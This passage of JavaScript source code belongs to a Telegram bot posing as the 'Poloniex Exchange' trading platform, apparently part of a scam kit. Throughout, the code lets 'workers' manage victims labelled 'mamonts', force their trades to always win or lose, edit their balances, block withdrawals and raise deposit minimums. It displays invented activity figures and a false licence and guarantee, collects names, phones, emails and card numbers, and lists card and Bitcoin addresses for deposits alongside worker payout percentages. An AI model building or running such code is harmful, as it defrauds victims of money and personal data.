                  {
                    text: "Отмена",
                    callback_data: 'cancel',
                  },
                ],
              ],
            }
          })
        }
      }
    };

    const intervalId = setInterval(updateTimeAndLog, 663);

    setTimeout(() => {
      clearInterval(intervalId);
    }, (time + 0.663) * 1000);
  }



  if (data.startsWith('set-win-')) {
    const mamontId = data.split('-')[2]
    await User.findOneAndUpdate({ id: mamontId }, { fart: 'Всегда вин' })
    return bot.sendMessage(chat.id, `✅ Фарт для мамонта успешно обновлен`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Вернуться в меню мамонта',
              callback_data: `mamont-${mamontId}`,
            },
          ],
        ],
      }
    })
  }

  if (data.startsWith('set-lose-')) {
    const mamontId = data.split('-')[2]
    await User.findOneAndUpdate({ id: mamontId }, { fart: 'Всегда луз' })
    return bot.sendMessage(chat.id, `✅ Фарт для мамонта успешно обновлен`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Вернуться в меню мамонта',
              callback_data: `mamont-${mamontId}`,
            },
          ],
        ],
      }
    })
  }

  if (data.startsWith('accept-edit-balance-')) {
    const info = data.split('-')
    await User.findOneAndUpdate({ id: info[3] }, { balance: +info[4] })
    return bot.sendMessage(chat.id, `✅ Баланс мамонта успешно обновлен`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🔙 Назад',
              callback_data: `mamont-${info[3]}`,
            },
          ],
        ],
      }
    })
  }

  if (data === 'cancel-edit-balance') {
    bot.sendMessage(chat.id, `❌ Баланс мамонта не обновлен`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🔙 Назад',
              callback_data: 'work',
            },
          ],
        ],
      }
    })
  }

  if (data === 'ecn') {
    return bot.sendPhoto(chat.id, `${BASE_URL}/bets.png`, {
      caption: `Выберите, куда бы вы хотели инвестировать:`,
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔵 Криптовалюты', callback_data: 'crypt' }, { text: '📉 Акции', callback_data: 'stocks' }],
          [{ text: '🔙 Вернуться в личный кабинет', callback_data: 'cabinet' }]
        ],
      },
    })
  }

  if (data === 'stocks') {
    const result = generateStocksData().reduce((acc, curr, index) => {
      if (index % 2 === 0) {
        acc.push([curr]);
      } else {
        acc[acc.length - 1].push(curr);
      }
      return acc;
    }, []);

    result.push([{ text: '🔙 Назад', callback_data: 'ecn' }])

    if (user.betBlocked) {
      return bot.sendMessage(chat.id, `
⚠ Вам заблокировали трейд
Уточните причину у администратора - https://t.me/PoloniexExchange_Support`, {
        reply_markup: {
          inline_keyboard: [
            [{ text: '🔙 Вернуться в личный кабинет', callback_data: 'cabinet' }],
          ],
        },
      })
    }

    return bot.sendMessage(chat.id, `
📈 ECN счет

💠 Выберите актив для инвестирования денежных средств:`, {
      reply_markup: {
        inline_keyboard: result
      },
    })
  }

  if (data === 'crypt') {
    const result = generateCryptoData().reduce((acc, curr, index) => {
      if (index % 2 === 0) {
        acc.push([curr]);
      } else {
        acc[acc.length - 1].push(curr);
      }
      return acc;
    }, []);

    result.push([{ text: '🔙 Назад', callback_data: 'ecn' }])



    if (user.betBlocked) {
      return bot.sendMessage(chat.id, `
⚠ Вам заблокировали трейд
Уточните причину у администратора - https://t.me/PoloniexExchange_Support`, {
        reply_markup: {
          inline_keyboard: [
            [{ text: '🔙 Вернуться в личный кабинет', callback_data: 'cabinet' }],
          ],
        },
      })
    }

    return bot.sendMessage(chat.id, `🌕 Выберите криптовалюту для дальнейшей торговли:`, {
      reply_markup: {
        inline_keyboard: result
      },
    })
  }

  if (data === 'pay') {
    return bot.sendPhoto(chat.id, `${BASE_URL}/pay.png`, {
      caption: `Выберите платежную систему для пополнения баланса`,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '💳 Пополнить через банковскую карту',
              callback_data: 'pay-card',
            },
          ],
          // [
          //   {
          //     text: '🥝 Пополнить через банковскую QIWI',
          //     callback_data: 'pay-qiwi',
          //   },
          // ],
          [
            {
              text: '💱 Пополнить через BTC',
              callback_data: 'pay-btc',
            }
          ],
          [
            {
              text: '🔙 Вернуться в личный кабинет',
              callback_data: 'cabinet',
            },
          ],
        ],
      },
    })
  }

  if (data === 'pay-card') {
    const usersWorker = await User.findOne({ mamonts: { $all: [user._id] } });
    bot.deleteMessage(chat.id, message.message_id)


    return bot.sendPhoto(chat.id, `${BASE_URL}/pay.png`, {
      caption: `
Оплата картой

⚠️ Уважаемый пользователь, Минимальная сумма - ${usersWorker?.deposit || 5000}₽

⚠️ Для пользователей, которые совершают пополнение впервые, с новых реквизитов, необходимо лично обратиться в Техническую Поддержку для пополнения пользовательского счета, а так же подтверждения статуса перевода.

      Для пополнения баланса картой совершите платеж по указанным реквизитам ниже, с указанным комментарием.

💱 Номер карты: \`2202203604751091\`

📝 Комментарий к платежу: ${user.id}

Если у вас нет возможности указать комментарий отправьте чек,квитанцию об оплате в техническую поддержку: [@PoloniexExchange_Support](https://t.me/PoloniexExchange_Support)`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Вернуться к выбору платежной системы',
              callback_data: 'pay',
            },
          ],
        ],
      },
    })
  }

  if (data === 'pay-btc') {
    const usersWorker = await User.findOne({ mamonts: { $all: [user._id] } });
    bot.deleteMessage(chat.id, message.message_id)


    return bot.sendPhoto(chat.id, `${BASE_URL}/pay.png`, {
      caption: `
Оплата BTC

Для пополнения BTC с внешнего кошелька используйте многоразовый адрес ниже.

💱 Адрес BTC: \`bc1q5sp7lqqxyga85gj7rtry2uj9hql732w098fs5j\`

После пополнения средств, отправьте чек, квитанцию, скриншот перевода в техническую поддержку [@PoloniexExchange_Support](https://t.me/PoloniexExchange_Support) и вам зачислят средства на ваш счёт.

⚠️ Уважаемый пользователь, обращаем ваше внимание, что все вводы меньше 10$ зачисляться в сервис не будут, возмещение по данным транзакциям так же не предусмотрено.`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Вернуться к выбору платежной системы',
              callback_data: 'pay',
            },
          ],
        ],
      }
    })
  }

  //   if (data === 'pay-qiwi') {
  //     const usersWorker = await User.findOne({ mamonts: { $all: [user._id] } });
  //     bot.deleteMessage(chat.id, message.message_id)


  //     return bot.sendPhoto(chat.id, `${BASE_URL}/pay.png`, {
  //       caption: `
  //       Оплата через QIWI

  // ⚠️ Уважаемый пользователь, Минимальная сумма - ${usersWorker?.deposit || 5000}₽

  // Для пополнения баланса QIWI совершите платеж по указанным реквизитам ниже, с указанным комментарием.

  // 💱 Номер QIWI: \`79506072262\`

  // 📝 Комментарий к платежу: ${user.id}

  // Если у вас нет возможности указать комментарий отправьте чек,квитанцию об оплате в техническую поддержку: [@PoloniexExchange_Support](https://t.me/PoloniexExchange_Support)`,
  //       parse_mode: 'Markdown',
  //       reply_markup: {
  //         inline_keyboard: [
  //           [
  //             {
  //               text: 'Вернуться к выбору платежной системы',
  //               callback_data: 'pay',
  //             },
  //           ],
  //         ],
  //       }
  //     })
  //   }





  if (data === 'withdraw') {

    if (user.withdrawBlocked) {
      return bot.sendPhoto(chat.id, `${BASE_URL}/withdraw.png`, {
        caption: `
⚠ Вывод средств заблокирован
Уточните причину в тех. поддержке - https://t.me/PoloniexExchange_Support
      `,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'Отмена',
                callback_data: 'cabinet',
              },
            ],
          ],
        },
      })
    }

    await User.findOneAndUpdate({ id: chat.id }, { state: 'set-withdraw' })
    return bot.sendPhoto(chat.id, `${BASE_URL}/withdraw.png`, {
      caption: `💰 Введите сумму вывода
У вас на балансе ${user.balance || 0} RUB`,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'cancel',
            },
          ],
        ],
      },
    })
  }

  if (data.startsWith('set-requisites-card-')) {
    const text = data.split('-')[3]
    await User.findOneAndUpdate({ id: chat.id }, { state: `set-requisites-card-${text}` })
    bot.deleteMessage(chat.id, message.message_id)

    return bot.sendMessage(chat.id, `
💳 Введите реквизиты на которые поступит вывод средств:

⚠️ Вывод средств возможен только на реквизиты с которых пополнялся ваш баланс! ⚠`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'cancel',
            },
          ],
        ],
      },
    })
  }

  if (data.startsWith('set-requisites-btc-')) {
    const text = data.split('-')[3]
    await User.findOneAndUpdate({ id: chat.id }, { state: `set-requisites-btc-${text}` })
    bot.deleteMessage(chat.id, message.message_id)

    return bot.sendMessage(chat.id, `
💳 Введите реквизиты на которые поступит вывод средств:

⚠️ Вывод средств возможен только на реквизиты с которых пополнялся ваш баланс! ⚠`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'cancel',
            },
          ],
        ],
      },
    })
  }

  //   if (data.startsWith('set-requisites-qiwi-')) {
  //     const text = data.split('-')[3]
  //     await User.findOneAndUpdate({ id: chat.id }, { state: `set-requisites-qiwi-${text}` })
  //     bot.deleteMessage(chat.id, message.message_id)

  //     return bot.sendMessage(chat.id, `
  // 🥝 Введите реквизиты на которые поступит вывод средств:

  // ⚠️ Вывод средств возможен только на реквизиты с которых пополнялся ваш баланс! ⚠`, {
  //       reply_markup: {
  //         inline_keyboard: [
  //           [
  //             {
  //               text: 'Отмена',
  //               callback_data: 'cancel',
  //             },
  //           ],
  //         ],
  //       },
  //     })
  //   }

  if (data === 'settings') {
    return settingsSection(chat.id, user)
  }

  if (data === 'set-name') {
    await User.findOneAndUpdate({ id: chat.id }, { state: 'set-name' })
    return bot.sendMessage(chat.id, `Пожалуйста, введите ваше полное Ф.И.О (Фамилия Имя Отчество):`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '✖️ Отмена',
              callback_data: 'settings-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data === 'set-country') {
    await User.findOneAndUpdate({ id: chat.id }, { state: 'set-country' })
    return bot.sendMessage(chat.id, `Пожалуйста, введите вашу страну:`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '✖️ Отмена',
              callback_data: 'settings-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data === 'set-email') {
    await User.findOneAndUpdate({ id: chat.id }, { state: 'set-email' })
    return bot.sendMessage(chat.id, `Пожалуйста, введите свой email:`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '✖️ Отмена',
              callback_data: 'settings-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data === 'set-phone') {
    await User.findOneAndUpdate({ id: chat.id }, { state: 'set-phone' })
    return bot.sendMessage(chat.id, `Пожалуйста, введите свой номер телефона:`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '✖️ Отмена',
              callback_data: 'settings-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data === 'set-card') {
    await User.findOneAndUpdate({ id: chat.id }, { state: 'set-card' })
    return bot.sendMessage(chat.id, `Пожалуйста, введите номер вашей карты:`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '✖️ Отмена',
              callback_data: 'settings-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data === 'info') {
    return bot.sendPhoto(chat.id, `${BASE_URL}/info.png`, {
      caption: `Выберите интересующую вас информацию:`,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🔆 Сертификат',
              callback_data: 'cert',
            },
            {
              text: '🔆 Гарантия сервиса',
              callback_data: 'guarantee',
            },
          ],
          [
            {
              text: '🔆 Состояние сети',
              callback_data: 'network',
            },
            {
              text: '🔆 Дополнительно',
              url: 'https://ru.beincrypto.com/exchanges/poloniex/',
            },
          ],
          [
            {
              text: '🔙 Вернуться в личный кабинет',
              callback_data: 'cabinet',
            },
          ],
        ],
      },
    })
  }

  if (data === 'work-info') {
    bot.deleteMessage(chat.id, message.message_id)
    return bot.sendMessage(chat.id, `
    Руководство пользования Poloniex Exchange для пользователей.

Руководство пользования Poloniex Exchange для ВОРКЕРОВ.`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🖥️ Связь с разработчиком 👨🏻‍💻',
              url: 'https://t.me/JoghDoe',
            },
            {
              text: '⚡️ |МЕНЮ ВОРКЕРА| ⚡️',
              callback_data: 'work',
            },
          ],
        ],
      },
    })
  }

  if (data === 'network') {
    return bot.sendMessage(chat.id, `
______________________________
Загруженность: |||||||||||||   50%
______________________________
Неподтверждённых транзакций: 2129

Комиссия для попадания в первый блок:
Minimum: 0.00003072 BTC / kVB
Median: 0.00004096 BTC / kVB`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🔙 Назад',
              callback_data: 'info',
            },
          ],
        ],
      },
    })
  }

  if (data === 'guarantee') {
    return bot.sendMessage(chat.id, `
🟢Poloniex Exchange - онлайн-биржа, предоставляющая услуги торговли бинарными опционами и другими финансовыми инструментами.

Важно понимать, что в любой финансовой сфере существуют риски, связанные с инвестированием и торговлей. Поэтому никакая биржа или компания не может дать полные гарантии прибыли или отсутствия рисков. Тем не менее, Poloniex Exchange может предоставить своим клиентам некоторые гарантии, чтобы обеспечить надежность и безопасность своих услуг.

Некоторые возможные гарантии, которые может предоставить Poloniex Exchange, включают в себя:

🔒Безопасность средств клиентов: Poloniex Exchange гарантирует сохранность средств клиентов на отдельных банковских счетах, отделенных от собственных средств компании. Это обеспечивает защиту пользователей от возможных финансовых рисков, связанных с банкротством биржи.

⚙️Безопасность транзакций: Poloniex Exchange использует высокоэффективные системы шифрования и защиты данных, чтобы обеспечить безопасность транзакций и защиту конфиденциальной информации клиентов.

🌐 Прозрачность и открытость: Poloniex Exchange предоставляет полную информацию о своих услугах, комиссиях, правилах и условиях, а также предоставляет своим клиентам возможность проверять свои счета.

🦹🏼‍♂️ Обучение и поддержка: Poloniex Exchange предоставляет полную поддержку своим клиентам, помогая им улучшать свои торговые навыки и получать доступ к актуальной информации и аналитике.

📲 Удобство и доступность: Poloniex Exchange предоставляет удобную и простую платформу для торговли, а также поддерживает широкий спектр способов пополнения и вывода средств.

✅Gembell Limited (компания, под руководством которой предоставляются услуги Poloniex Exchange регулируется ЦРОФР (Номер лицензии TSRF RU 0395 AA Vv0207).

Тем не менее, напоминаем, что никакая компания или биржа не может дать 100%-ю гарантию на инвестиции. Поэтому, перед тем как начать инвестировать, настоятельно рекомендуется ознакомиться с правилами и условиями биржи и тщательно изучить все возможные риски.`, {
      caption: `🔆 Гарантия сервиса`,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🔙 Назад',
              callback_data: 'info',
            },
          ],
        ],
      },
    })
  }

  if (data === 'support') {
    bot.deleteMessage(chat.id, message.message_id)

    return bot.sendPhoto(chat.id, `${BASE_URL}/support.jpg`, {
      caption: `
🛠️ Наша официальная техническая поддержка

У вас возникли вопросы или проблемы❔🖥❕
Вы всегда можете обратиться в нашу службу технической поддержки

🧾 Правила общения с оператором:
➕ Общайтесь вежливо, по ту сторону сидит такой же живой человек, как и Вы.
➕ Старайтесь формулировать обращение к оператору емко и лаконично, в одно сообщение.
➕ Обращаться в поддержку только по существу!
➕ Поддержка не ведёт продаж и не занимается привлечением клиентов! (Только решение споров, об оплате и выводов).
➕ Формулировать обращение к оператору необходимо с квитанцией об оплате
Сообщения по типу: - Я не сохранил чек - Я перевел, посмотрите - Привет(т.д.) ⚠️ Категорически игнорируются!

 🛠️ Наша официальная техническая поддержка
      `,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Написать',
              url: 'https://t.me/PoloniexExchange_Support',
            },
            {
              text: '⚙️ Вернуться к настройкам',
              callback_data: 'settings',
            },
          ],
        ],
      },
    })
  }
})

function personalCabinet(chatId, user) {
  const { currentDateTimeString, createdAtDateStringString } = formateDate(
    user.createdAt
  )

  if (!user.confirmed) {
    return bot.sendMessage(chatId, `https://telegra.ph/Soglashenie-dlya-otkrytiya-ECN-02-17-2`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Прочитал и согласен с условиями',
              callback_data: 'confirm',
            },
          ],
        ],
      },
    })
  }

  const buttons = [

    [
      {
        text: '🖥️ Личный кабинет',
        callback_data: 'cabinet',
      },
    ],
    [
      {
        text: '📈 Счет ECN',
        callback_data: 'ecn',
      },
    ],
    [
      {
        text: '💳 Пополнить',
        callback_data: 'pay',
      },
      {
        text: '🏦 Вывести активы',
        callback_data: 'withdraw',
      },
    ],
    [
      {
        text: '🛠️ Настройки',
        callback_data: 'settings',
      },
      {
        text: 'ℹ Информация о нас',
        callback_data: 'info',
      },
    ],
    [
      {
        text: '⚙️ Тех. Поддержка',
        url: 'https://t.me/PoloniexExchange_Support',
      },
    ],
  ]

  if (user.isWorker) {
    buttons.unshift([
      {
        text: '⚡️ [МЕНЮ ВОРКЕРА] ⚡️',
        callback_data: 'work',
      },
    ])
  }

  return bot.sendPhoto(chatId, `${BASE_URL}/cabinet.png`, {
    caption: `
🖥 Личный кабинет

➖➖➖➖➖➖➖➖➖➖➖➖
🆔 Ваш ID: ${user.id}
💰 Баланс: ${user.balance || 0} RUB
➖➖➖➖➖➖➖➖➖➖➖➖
Load Bitcoin: ${getRandomEmoji()}
Load Ethereum: ${getRandomEmoji()}
Load Litecoin: ${getRandomEmoji()}
➖➖➖➖➖➖➖➖➖➖➖➖
ℹ️Информация о пользователе:

🌍 Ваша страна: ${user.country || 'Не указано'}
📪 Ваш email: ${user.email || 'Не указано'}
💳 Ваша карта: ${user.card || 'Не указано'}
👤 Ваше Ф.И.О: ${user.fio || 'Не указано'}
📱 Ваш номер: ${user.phone || 'Не указано'}
➖➖➖➖➖➖➖➖➖➖➖➖

📱 Активных пользователей онлайн: ${generateRandomNumber(3100, 8200)}
🟢 Открытые сделки онлайн - ${generateRandomNumber(1100, 5200)}

📝 Текущая дата и время: ${currentDateTimeString}
📆 Дата регистрации: ${createdAtDateStringString}
  `,
    reply_markup: {
      inline_keyboard: buttons
    },
  })
}


function workerCabinet(chatId, user) {

  const buttons = [

    [
      {
        text: '🦣 Мои мамонты',
        callback_data: 'my-mamonts',
      },
      {
        text: '🦣 Добавить мамонта',
        callback_data: 'add-mamont',
      },
    ],
    [
      {
        text: `💲 Минимальный депозит для мамонта: ${user.deposit}`,
        callback_data: 'min-deposit',
      },
    ],

    [
      {
        text: '? Инфо 👨🏻‍💻',
        callback_data: 'work-info',
      },
    ],
    [
      {
        text: '🔙 Выйти из меню воркера',
        callback_data: 'cabinet',
      }
    ]
  ]

  return bot.sendMessage(chatId, `
⚡️ Меню воркера:

├ 💳 Банковская Карта: \`4890494760441873\`
└ 💲 Bitcoin: \`bc1q5sp7lqqxyga85gj7rtpo7cg56sv32w098fs5j\`

🌐  Проценты выплат
├ 💲 Пополнение: 80%
├ 💲 Прямой перевод: 75%
├ 💲 Добив через ТП: 70%
├ 💲 Добив через ТП х2: 70%
├ 💲 Добив через ТП х3: 70%
├ 💲 Добив через ТП х4: 70%
└ 💲 Добив через ТП х5: 70%

👤 Реферальная ссылка:
[https://t.me/PoloniexExchange_Bot?start=${user.id}](https://t.me/PoloniexExchange_Bot?start=${user.id})`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: buttons
      },
    },
  )
}

function settingsSection(chatId, user) {
  return bot.sendPhoto(chatId, `${BASE_URL}/settings.png`, {
    caption: `
ℹ️Информация о пользователе:

🌍 Ваша страна: ${user.country || 'Не указано'}
📪 Ваш email: ${user.email || 'Не указано'}
💳 Ваша карта: ${user.card || 'Не указано'}
👤 Ваше Ф.И.О: ${user.fio || 'Не указано'}
📱 Ваш номер: ${user.phone || 'Не указано'}

⚙️ Выберите интересующий вас параметр, для дальнейшего изменения.
      `,
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: '👤 Установить Ф.И.О',
            callback_data: 'set-name',
          },
        ],
        [
          {
            text: '🌍 Установить страну',
            callback_data: 'set-country',
          },
          {
            text: '✉️ Установить email',
            callback_data: 'set-email',
          },
        ],
        [
          {
            text: '📱 Установить номер',
            callback_data: 'set-phone',
          },
          {
            text: '💳 Установить карту',
            callback_data: 'set-card',
          },
        ],
        [
          {
            text: '🛠️ Тех. Поддержка',
            callback_data: 'support',
          },
        ],
        [
          {
            text: '🔙 Выйти из меню настроек',
            callback_data: 'cabinet',
          },
        ],
      ],
    },
  })
}